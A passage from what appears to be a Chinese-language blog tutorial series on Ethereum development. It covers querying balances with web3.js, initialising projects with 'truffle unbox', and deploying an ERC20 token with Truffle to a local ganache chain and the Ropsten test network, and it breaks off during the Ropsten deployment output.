<h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><p>目前(20180607) 还是0.xx(0.20.6)版的，1.0还没有发布。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><a href="https://github.com/ethereum/wiki/wiki/JavaScript-API" target="_blank" rel="noopener">Documentation</a></p>
<h4 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h4><p>新建一个目录 ( 空的web工程 )，新建文件demoHello.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        .editext&#123;</span><br><span class="line">            width: 50%;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        输入服务地址：<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"editext"</span> <span class="attr">id</span>=<span class="string">"host"</span> <span class="attr">value</span>=<span class="string">"http://localhost:7545"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        输入账号地址：<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"editext"</span> <span class="attr">id</span>=<span class="string">"address"</span> <span class="attr">value</span>=<span class="string">"0x1fdaA44143663f45C54b78c3cA4224Fc1Bb92c53"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"balance"</span> <span class="attr">style</span>=<span class="string">"color:red"</span>&gt;</span>刷新网页查询余额<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> host = $(<span class="string">"#host"</span>).val();</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> address = $(<span class="string">"#address"</span>).val();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> Web3 = <span class="built_in">require</span>(<span class="string">'web3'</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> web3 = <span class="keyword">new</span> Web3();</span></span><br><span class="line"><span class="javascript">    <span class="comment">//default "http://localhost:8545"</span></span></span><br><span class="line"><span class="javascript">    web3.setProvider(<span class="keyword">new</span> web3.providers.HttpProvider(host));</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> coinbase = web3.eth.coinbase;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> originalBalance = web3.eth.getBalance(coinbase).toNumber();</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(coinbase);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(originalBalance);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> version = web3.version.api;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(version);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> version = web3.version.node;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(version);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> mining = web3.eth.mining;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"节点是否挖矿："</span>+mining); <span class="comment">// true or false</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> accounts = web3.eth.accounts;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(accounts);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> number = web3.eth.blockNumber;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"当前区块号:"</span>+number);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> info = web3.eth.getBlock(number);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"区块"</span>+number + <span class="string">"的信息："</span>);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(info);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> balance = web3.eth.getBalance(address);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    $(<span class="string">"#balance"</span>).html(<span class="string">"余额："</span>+balance);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"余额："</span>+balance); <span class="comment">// instanceof BigNumber</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"余额stirng："</span>+balance.toString(<span class="number">10</span>)); <span class="comment">// '1000000000000'</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"余额number："</span>+balance.toNumber()); <span class="comment">// 1000000000000</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在浏览器打开demo.html，正常的话，会在控制台打印：</p>
<p><img src="/images/blockchain/查询余额.png" alt="查询余额.png"></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>8.1、基于truffle unbox初始化项目</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/8.1%E3%80%81%E5%9F%BA%E4%BA%8Etruffle%20unbox%E5%88%9D%E5%A7%8B%E5%8C%96%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p>在前面我们知道可以通过 <code>truffle init</code> 来初始化项目，但是这个只是一个智能合约相关的项目，如果我们要开发Dapp Web 应用，还得做一些配置之类的工作，所以truffle带了unbox功能，直接初始化一个集成各种配置环境的项目，如react、vue等。</p>
<p>在空目录下通过命令 <code>truffle unbox [name of box]</code> 就能生成一个开箱即用的项目。</p>
<p><code>[name of box]</code> 的都在 <a href="https://github.com/truffle-box" target="_blank" rel="noopener">github</a>或者<a href="https://truffleframework.org/boxes/" target="_blank" rel="noopener">truffleframework</a> 可以找到。</p>
<p>比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># MetaCoin 智能合约实例</span><br><span class="line">$ truffle unbox metacoin-box </span><br><span class="line"></span><br><span class="line"># 包含所有 OpenZeppelin 的教程ls</span><br><span class="line">$ truffle unbox tutorialtoken-box</span><br><span class="line"></span><br><span class="line"># 宠物商店DApp的完整项目代码</span><br><span class="line">$ truffle unbox pet-shop</span><br><span class="line"></span><br><span class="line"># 使用Webpack的前端项目，包含合约、迁移、测试、用户界面和webpack构建流水线</span><br><span class="line">$ truffle unbox webpack</span><br><span class="line"></span><br><span class="line"># 使用vue框架进行dapp开发</span><br><span class="line">$ truffle unbox DOkwufulueze/eth-vue</span><br></pre></td></tr></table></figure>
<p>可以看到 <code>unbox</code> 其实是下载 github 仓库的zip包，我们也可以直接 clone github 上的仓库代码到本地。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>8.2、基于truffle发布Token到Ropsten测试网络</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/8.2%E3%80%81%E5%9F%BA%E4%BA%8Etruffle%E5%8F%91%E5%B8%83Token%E5%88%B0Ropsten%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<p>我们利用 <code>truffle</code> 的集成环境发布一个名称为 <code>VToken</code> 的代币到Ropsten测试网络。</p>
<h3 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h3><p>本示例在Ubuntu下开发(原因下面会解释)<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">node：v10.16.0</span><br><span class="line">npm：v6.9.0</span><br></pre></td></tr></table></figure></p>
<h3 id="truffle常用命令"><a href="#truffle常用命令" class="headerlink" title="truffle常用命令"></a>truffle常用命令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">samwen@samwen-ubuntu:~/VToken$ truffle -v</span><br><span class="line">Truffle v5.0.24 - a development framework <span class="keyword">for</span> Ethereum</span><br><span class="line"></span><br><span class="line">Usage: truffle &lt;<span class="built_in">command</span>&gt; [options]</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  build     Execute build pipeline (<span class="keyword">if</span> configuration present)</span><br><span class="line">  compile   Compile contract <span class="built_in">source</span> files</span><br><span class="line">  config    Set user-level configuration options</span><br><span class="line">  console   Run a console with contract abstractions and commands available</span><br><span class="line">  create    Helper to create new contracts, migrations and tests</span><br><span class="line">  debug     Interactively debug any transaction on the blockchain (experimental)</span><br><span class="line">  deploy    (<span class="built_in">alias</span> <span class="keyword">for</span> migrate)</span><br><span class="line">  develop   Open a console with a <span class="built_in">local</span> development blockchain</span><br><span class="line">  <span class="built_in">exec</span>      Execute a JS module within this Truffle environment</span><br><span class="line">  <span class="built_in">help</span>      List all commands or provide information about a specific <span class="built_in">command</span></span><br><span class="line">  init      Initialize new and empty Ethereum project</span><br><span class="line">  install   Install a package from the Ethereum Package Registry</span><br><span class="line">  migrate   Run migrations to deploy contracts</span><br><span class="line">  networks  Show addresses <span class="keyword">for</span> deployed contracts on each network</span><br><span class="line">  obtain    Fetch and cache a specified compiler</span><br><span class="line">  opcode    Print the compiled opcodes <span class="keyword">for</span> a given contract</span><br><span class="line">  publish   Publish a package to the Ethereum Package Registry</span><br><span class="line">  run       Run a third-party <span class="built_in">command</span></span><br><span class="line">  <span class="built_in">test</span>      Run JavaScript and Solidity tests</span><br><span class="line">  unbox     Download a Truffle Box, a pre-built Truffle project</span><br><span class="line">  version   Show version number and <span class="built_in">exit</span></span><br><span class="line">  watch     Watch filesystem <span class="keyword">for</span> changes and rebuild the project automatically</span><br><span class="line"></span><br><span class="line">See more at http://truffleframework.com/docs</span><br></pre></td></tr></table></figure>
<h3 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h3><p>由于不需要webapp，所以直接初始化一个truffle项目即可。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">samwen@samwen-ubuntu:~$ mkdir VToken</span><br><span class="line">samwen@samwen-ubuntu:~$ <span class="built_in">cd</span> VToken/</span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ truffle init</span><br><span class="line"></span><br><span class="line">✔ Preparing to download</span><br><span class="line">✔ Downloading</span><br><span class="line">✔ Cleaning up temporary files</span><br><span class="line">✔ Setting up box</span><br><span class="line"></span><br><span class="line">Unbox successful. Sweet!</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line"></span><br><span class="line">  Compile:        truffle compile</span><br><span class="line">  Migrate:        truffle migrate</span><br><span class="line">  Test contracts: truffle <span class="built_in">test</span></span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ tree</span><br><span class="line">.</span><br><span class="line">├── contracts</span><br><span class="line">│   └── Migrations.sol</span><br><span class="line">├── migrations</span><br><span class="line">│   └── 1_initial_migration.js</span><br><span class="line">├── <span class="built_in">test</span></span><br><span class="line">└── truffle-config.js</span><br><span class="line"></span><br><span class="line">3 directories, 3 files</span><br></pre></td></tr></table></figure></p>
<h3 id="编写ERC20标准智能合约"><a href="#编写ERC20标准智能合约" class="headerlink" title="编写ERC20标准智能合约"></a>编写ERC20标准智能合约</h3><p>为了方便测试，我们继承 <code>zeppelin-solidity</code> 的ERC20合约，<a href="https://eips.ethereum.org/EIPS/eip-20" target="_blank" rel="noopener">EIP-20标准文档</a>。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">samwen@samwen-ubuntu:~/VToken$ vim package.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"VToken"</span>,</span><br><span class="line">  <span class="string">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="string">"dependencies"</span>: &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ sudo npm install zeppelin-solidity</span><br><span class="line">samwen@samwen-ubuntu:~/VToken$ vim /contracts/VToken.sol</span><br></pre></td></tr></table></figure></p>
<p>VToken合约代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract VToken is StandardToken &#123;</span><br><span class="line"></span><br><span class="line">    string public name = <span class="string">"VToken"</span>;</span><br><span class="line">    string public symbol = <span class="string">"VTK"</span>;</span><br><span class="line">    uint8 public decimals = <span class="number">18</span>;</span><br><span class="line">    uint public INITIAL_SUPPLY = <span class="number">1000000000</span>;<span class="comment">//10亿</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="keyword">constructor</span>()public&#123;</span><br><span class="line"></span><br><span class="line">        totalSupply_ = INITIAL_SUPPLY;<span class="comment">//此处发行量错误，看：修复！</span></span><br><span class="line">        balances[msg.sender] = INITIAL_SUPPLY;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<div style="color: red"><br><strong> 修复！修复！修复！</strong><br><strong> 修复！修复！修复！</strong><br><strong> 修复！修复！修复！</strong><br></div>

<p>发布之后发现账号的VToken余额都是 <code>0</code> ，才发现：</p>
<blockquote>
<p>这里发行量 <code>INITIAL_SUPPLY</code> 搞错了，小数点是18位，应该还需要加18个零才是10亿。当然也可以设置 <code>decimals=0</code> ，那么 <code>VToken</code> 就没有小数，最小单位就是 <code>1VTk</code> 。<br>可以将构造函数修改为以下(decimals=18)：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//补“小数位”个数的零，这里是18。</span></span><br><span class="line">totalSupply_ = INITIAL_SUPPLY * <span class="number">10</span> ** uint256(decimals); </span><br><span class="line">balances[msg.sender] = totalSupply_;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="编译-amp-本地测试部署"><a href="#编译-amp-本地测试部署" class="headerlink" title="编译&amp;本地测试部署"></a>编译&amp;本地测试部署</h3><p>将 <code>truffle-config.js</code> 重命名为 <code>truffle.js</code> ,并修改内容为：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  </span><br><span class="line">  networks: &#123;</span><br><span class="line">    development: &#123;</span><br><span class="line">     host: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">     port: <span class="number">8545</span>,</span><br><span class="line">     network_id: <span class="string">"*"</span>,</span><br><span class="line">     gas: <span class="number">6721975</span>,</span><br><span class="line">     gasPrice: <span class="number">20000000000</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  compilers: &#123;</span><br><span class="line">    solc: &#123;</span><br><span class="line">      version: <span class="string">"0.4.24"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在migrations目录下新建 <code>2_deploy_contracts.js</code> ，配置部署我们的合约。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> VToken = artifacts.require(<span class="string">"VToken"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer.deploy(VToken);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>开始编译<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">samwen@samwen-ubuntu:~/VToken$ truffle compile</span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">&gt; Compiling ./contracts/VToken.sol</span><br><span class="line">&gt; Artifacts written to /home/samwen/VToken/build/contracts</span><br><span class="line">&gt; Compiled successfully using:</span><br><span class="line">   - solc: 0.4.24+commit.e67f0147.Emscripten.clang</span><br></pre></td></tr></table></figure></p>
<p>编译通过，用一个新的终端启动本地 <code>testrpc</code>。</p>
<blockquote>
<p>如果没有安装，运行： <code>npm install -g ganache-cli</code></p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">samwen@samwen-ubuntu:~$ ganache-cli</span><br><span class="line">Ganache CLI v6.4.4 (ganache-core: 2.5.6)</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">HD Wallet</span><br><span class="line">==================</span><br><span class="line">Mnemonic:      copy speak kitten fiscal wrestle stool unfair alcohol <span class="built_in">source</span> siren chicken patient</span><br><span class="line">Base HD Path:  m/44<span class="string">'/60'</span>/0<span class="string">'/0/&#123;account_index&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Gas Price</span></span><br><span class="line"><span class="string">==================</span></span><br><span class="line"><span class="string">20000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Gas Limit</span></span><br><span class="line"><span class="string">==================</span></span><br><span class="line"><span class="string">6721975</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Listening on 127.0.0.1:8545</span></span><br></pre></td></tr></table></figure>
<p>开始部署</p>
<blockquote>
<p>deploy 和 migrate 一样</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">samwen@samwen-ubuntu:~/VToken$ truffle deploy</span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">&gt; Everything is up to date, there is nothing to compile.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Starting migrations...</span><br><span class="line">======================</span><br><span class="line">&gt; Network name:    <span class="string">'development'</span></span><br><span class="line">&gt; Network id:      1561694497418</span><br><span class="line">&gt; Block gas <span class="built_in">limit</span>: 0x6691b7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1_initial_migration.js</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">   Deploying <span class="string">'Migrations'</span></span><br><span class="line">   ----------------------</span><br><span class="line">   &gt; transaction <span class="built_in">hash</span>:    0x327b6ca1a13f4d95206953a18b7228f6258db111ddfc94c7e19a2e2368189975</span><br><span class="line">   &gt; Blocks: 0            Seconds: 0</span><br><span class="line">   &gt; contract address:    0xbf744a6b346e8c4f1335077F3Fbcb94624E80F86</span><br><span class="line">   &gt; block number:        5</span><br><span class="line">   &gt; block timestamp:     1561695101</span><br><span class="line">   &gt; account:             0x43df1995a777C2b14D011D565beE7411109DaeF3</span><br><span class="line">   &gt; balance:             99.95728774</span><br><span class="line">   &gt; gas used:            277462</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.00554924 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &gt; Saving migration to chain.</span><br><span class="line">   &gt; Saving artifacts</span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.00554924 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2_deploy_contracts.js</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">   Deploying <span class="string">'VToken'</span></span><br><span class="line">   ------------------</span><br><span class="line">   &gt; transaction <span class="built_in">hash</span>:    0x21c591204930427919cdcbbd2f6b98895174e2798c0bed8499e7d7b8198c3403</span><br><span class="line">   &gt; Blocks: 0            Seconds: 0</span><br><span class="line">   &gt; contract address:    0x8E4FBa7256b92837723688AFFFc7DC6679d3d538</span><br><span class="line">   &gt; block number:        7</span><br><span class="line">   &gt; block timestamp:     1561695102</span><br><span class="line">   &gt; account:             0x43df1995a777C2b14D011D565beE7411109DaeF3</span><br><span class="line">   &gt; balance:             99.92621412</span><br><span class="line">   &gt; gas used:            1511673</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.03023346 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &gt; Saving migration to chain.</span><br><span class="line">   &gt; Saving artifacts</span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.03023346 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Summary</span><br><span class="line">=======</span><br><span class="line">&gt; Total deployments:   2</span><br><span class="line">&gt; Final cost:          0.0357827 ETH</span><br><span class="line"></span><br><span class="line">samwen@samwen-ubuntu:~/VToken$</span><br></pre></td></tr></table></figure>
<p>到此证明我的项目的合约是没有问题的了，那么接下来就可以尝试部署到公网Ropsten网络。</p>
<h3 id="注册infura-io"><a href="#注册infura-io" class="headerlink" title="注册infura.io"></a>注册infura.io</h3><p>infura提供公开以太坊和测试节点,在 <code>https://infura.io/login</code> 用邮箱注册一个账号和新建project，得到一个带token的链接地址。</p>
<p><a href="https://www.cnblogs.com/wanghui-garcia/p/9719399.html" target="_blank" rel="noopener">infura的使用</a></p>
<h3 id="申请ETH账号"><a href="#申请ETH账号" class="headerlink" title="申请ETH账号"></a>申请ETH账号</h3><ol>
<li>用MetaMask申请一个账号（我申请的是： <code>0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65</code>）</li>
<li>选择“Ropsten测试网络”</li>
<li>点击“存入”，从“测试水管”领取一个ETH</li>
<li>导出“助记词”</li>
</ol>
<blockquote>
<p>如果安装MetaMask插件遇到网络问题，可以临时用<a href="https://www.myetherwallet.com/" target="_blank" rel="noopener">网页钱包</a>创建账号。</p>
</blockquote>
<h3 id="Ropsten网络配置"><a href="#Ropsten网络配置" class="headerlink" title="Ropsten网络配置"></a>Ropsten网络配置</h3><p>修改 <code>truffle.js</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> HDWalletProvider = <span class="built_in">require</span>(<span class="string">"truffle-hdwallet-provider"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mnemonic = <span class="string">"MetaMask导出的助记词"</span>;</span><br><span class="line"><span class="keyword">var</span> infura = <span class="string">"https://ropsten.infura.io/v3/&#123;你的token&#125;&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  </span><br><span class="line">  networks: &#123;</span><br><span class="line">    development: &#123;</span><br><span class="line">     host: <span class="string">"127.0.0.1"</span>,     <span class="comment">// Localhost (default: none)</span></span><br><span class="line">     port: <span class="number">8545</span>,            <span class="comment">// Standard Ethereum port (default: none)</span></span><br><span class="line">     network_id: <span class="string">"*"</span>,       <span class="comment">// Any network (default: none)</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    ropsten: &#123;</span><br><span class="line">      provider: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> HDWalletProvider(mnemonic, infura),</span><br><span class="line">      network_id: <span class="number">3</span>,       <span class="comment">// Ropsten's id</span></span><br><span class="line">      gas: <span class="number">6721975</span>,</span><br><span class="line">      gasPrice: <span class="number">20000000000</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  compilers: &#123;</span><br><span class="line">    solc: &#123;</span><br><span class="line">      version: <span class="string">"0.4.24"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">samwen@samwen-ubuntu:~/VToken$ npm install truffle-hdwallet-provider --unsafe-perm=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>此处坑比较多，特别是Win10下，文章后面描述在Ubuntu下的解决办法 ，<a href="./#hdwallet安装问题">《hdwallet安装问题》</a>。</p>
<h3 id="部署到Ropsten网络"><a href="#部署到Ropsten网络" class="headerlink" title="部署到Ropsten网络"></a>部署到Ropsten网络</h3><p>本次部署运气比较好，只遇到一次网络错误就部署成功了，有时候运行半天都部署不了。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">samwen@samwen-ubuntu:~/VToken$ truffle deploy --reset --network ropsten</span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">&gt; Everything is up to date, there is nothing to compile.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Migrations dry-run (simulation)</span><br><span class="line">===============================</span><br><span class="line">&gt; Network name:    <span class="string">'ropsten-fork'</span></span><br><span class="line">&gt; Network id:      3</span><br><span class="line">&gt; Block gas <span class="built_in">limit</span>: 0x7a1200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1_initial_migration.js</span><br><span class="line">======================</span><br><span class="line">Error: Invalid JSON RPC response: <span class="string">""</span></span><br><span class="line">    at Object.InvalidResponse (/home/samwen/VToken/node_modules/truffle-hdwallet-provider/dist/webpack:/truffle-hdwallet-provider/Users/tyler/projects/truffle/node_modules/web3-providers-http/node_modules/web3-core-helpers/src/errors.js:42:1)</span><br><span class="line">    at e.InvalidResponse [as onreadystatechange] (/home/samwen/VToken/node_modules/truffle-hdwallet-provider/dist/webpack:/truffle-hdwallet-provider/Users/tyler/projects/truffle/node_modules/web3-providers-http/src/index.js:92:1)</span><br><span class="line">    at e._a [as dispatchEvent] (/home/samwen/VToken/node_modules/truffle-hdwallet-provider/dist/webpack:/truffle-hdwallet-provider/Users/tyler/projects/truffle/node_modules/xhr2-cookies/dist/xml-http-request-event-target.js:27:61)</span><br><span class="line">    at e.dispatchEvent [as _setReadyState] (/home/samwen/VToken/node_modules/truffle-hdwallet-provider/dist/webpack:/truffle-hdwallet-provider/Users/tyler/projects/truffle/node_modules/xhr2-cookies/dist/xml-http-request.js:208:1)</span><br><span class="line">    at e._setReadyState [as _onHttpRequestError] (/home/samwen/VToken/node_modules/truffle-hdwallet-provider/dist/webpack:/truffle-hdwallet-provider/Users/tyler/projects/truffle/node_modules/xhr2-cookies/dist/xml-http-request.js:349:1)</span><br><span class="line">    at ClientRequest._onHttpRequestError (/home/samwen/VToken/node_modules/truffle-hdwallet-provider/dist/webpack:/truffle-hdwallet-provider/Users/tyler/projects/truffle/node_modules/xhr2-cookies/dist/xml-http-request.js:252:47)</span><br><span class="line">    at ClientRequest.emit (events.js:198:13)</span><br><span class="line">    at TLSSocket.socketErrorListener (_http_client.js:392:9)</span><br><span class="line">    at TLSSocket.emit (events.js:198:13)</span><br><span class="line">    at emitErrorNT (internal/streams/destroy.js:91:8)</span><br><span class="line">    at emitErrorAndCloseNT (internal/streams/destroy.js:59:3)</span><br><span class="line">    at process._tickCallback (internal/process/next_tick.js:63:19)</span><br><span class="line"></span><br><span class="line">   Deploying <span class="string">'Migrations'</span></span><br><span class="line">   ----------------------</span><br><span class="line">   &gt; block number:        5878867</span><br><span class="line">   &gt; block timestamp:     1561706914</span><br><span class="line">   &gt; account:             0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65</span><br><span class="line">   &gt; balance:             1.99475076</span><br><span class="line">   &gt; gas used:            262462</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.00524924 ETH</span><br><span class="line"></span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.00524924 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2_deploy_contracts.js</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">   Deploying <span class="string">'VToken'</span></span><br><span class="line">   ------------------</span><br><span class="line">   &gt; block number:        5878869</span><br><span class="line">   &gt; block timestamp:     1561706947</span><br><span 